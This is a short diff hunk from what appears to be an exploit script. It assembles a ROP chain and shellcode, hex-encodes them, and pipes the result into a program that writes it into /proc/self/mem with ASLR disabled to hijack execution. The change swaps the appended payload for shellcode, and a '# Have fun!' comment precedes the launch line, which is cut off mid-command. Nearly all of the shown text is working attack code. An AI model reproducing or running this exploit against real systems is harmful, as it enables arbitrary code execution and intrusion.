@@ -318,7 +318,7 @@ fi
 rop=$(craft_rop $sc_len)
 rop_len=$((${#rop} / 2))
 
-payload=$(echo -n $rop$payload2 | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+payload=$(echo -n $rop$sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # Have fun!
 printf $payload |\
 (sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
